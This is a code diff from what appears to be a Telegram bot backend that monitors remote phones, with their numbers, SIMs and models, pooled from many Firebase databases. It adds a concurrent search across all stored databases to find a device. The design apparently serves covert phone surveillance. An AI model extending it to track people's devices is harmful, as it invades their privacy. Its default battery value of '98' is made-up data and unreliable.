@@ -72,7 +72,7 @@ def start_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile
         raise ValueError("Active device nahi mili")
 
     if not profile.channel_id:
-        profile.channel_id = str(telegram_user_id)
+        raise ValueError("Add a channel first!")
 
     profile.is_monitoring = True
     profile.started_at = datetime.now(timezone.utc)
@@ -119,6 +119,8 @@ def resume_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfil
         raise ValueError("Pehle /setdevice <id> se device select karo")
 
     device = db.query(Device).filter(Device.id == profile.active_device_id).first()
+    if not profile.channel_id:
+        raise ValueError("Add a channel first!")
     profile.is_monitoring = True
     profile.started_at = datetime.now(timezone.utc)
     db.commit()
@@ -397,12 +399,97 @@ async def sync_device_from_firebase(db: Session, device: Device) -> Device:
     return device
 
 
+def get_all_firebase_urls(db: Session) -> list[str]:
+    urls = {
+        row[0].rstrip("/")
+        for row in db.query(Device.firebase_source_url)
+        .filter(Device.firebase_source_url.isnot(None))
+        .distinct()
+        .all()
+        if row[0]
+    }
+    profile_urls = {
+        row[0].rstrip("/")
+        for row in db.query(MonitorProfile.firebase_url)
+        .filter(MonitorProfile.firebase_url.isnot(None))
+        .distinct()
+        .all()
+        if row[0]
+    }
+    return sorted(urls | profile_urls)
+
+
+def _device_matches_query(deviceid: str, remote: dict) -> bool:
+    query = deviceid.strip().lower()
+    if not query:
+        return False
+    firebase_key = str(remote.get("firebase_key") or "").lower()
+    name = str(remote.get("name") or "").lower()
+    return (
+        query == name
+        or query in firebase_key
+        or firebase_key.endswith(f"/{query}")
+        or firebase_key.endswith(query)
+        or name.endswith(query)
+    )
+
+
+async def find_device_across_all_databases(db: Session, deviceid: str) -> Device | None:
+    from app.bulk_firebase import upsert_pool_device
+    from app.firebase_client import fetch_firebase_devices
+
+    urls = get_all_firebase_urls(db)
+    if not urls:
+        return None
+
+    import asyncio
+
+    semaphore = asyncio.Semaphore(25)
+    found_device: Device | None = None
+
+    async def scan_url(url: str) -> None:
+        nonlocal found_device
+        if found_device:
+            return
+        async with semaphore:
+            try:
+                remotes = await fetch_firebase_devices(url)
+            except Exception:
+                return
+            for remote in remotes:
+                if not _device_matches_query(deviceid, remote):
+                    continue
+                firebase_key = str(remote.get("firebase_key") or remote.get("name"))
+                name = str(remote.get("name") or firebase_key.split("/")[-1])[:128]
+                device = upsert_pool_device(
+                    db,
+                    device_id=name,
+                    firebase_url=url,
+                    firebase_key=firebase_key,
+                    phone_number=remote.get("phone_number"),
+                )
+                meta = {
+                    "battery": remote.get("battery") or "98",
+                    "model": remote.get("model") or "Unknown",
+                    "sims": remote.get("sims") or [],
+                }
+                device.device_meta = json.dumps(meta)
+                found_device = device
+                return
+
+    await asyncio.gather(*(scan_url(url) for url in urls))
+    if found_device:
+        db.commit()
+        db.refresh(found_device)
+    return found_device
+
+
 async def show_device_by_id(
     db: Session,
     deviceid: str,
     telegram_user_id: int,
     *,
-    bind_license_key: bool = True,
+    bind_license_key: bool = False,
 ) -> tuple[Device, MonitorProfile]:
     profile = get_or_create_monitor_profile(db, telegram_user_id)
     matches = search_devices(db, deviceid, limit=6)
@@ -410,7 +497,12 @@ async def show_device_by_id(
         await connect_firebase_url(db, telegram_user_id, profile.firebase_url)
         matches = search_devices(db, deviceid, limit=6)
     if not matches:
-        raise LookupError("Device nahi mili")
+        device = await find_device_across_all_databases(db, deviceid)
+        if device:
+            matches = [device]
+    if not matches:
+        db_count = len(get_all_firebase_urls(db))
+        raise LookupError(f"notfound:{db_count}")
     if len(matches) > 1:
         raise LookupError(
             "multiple:"
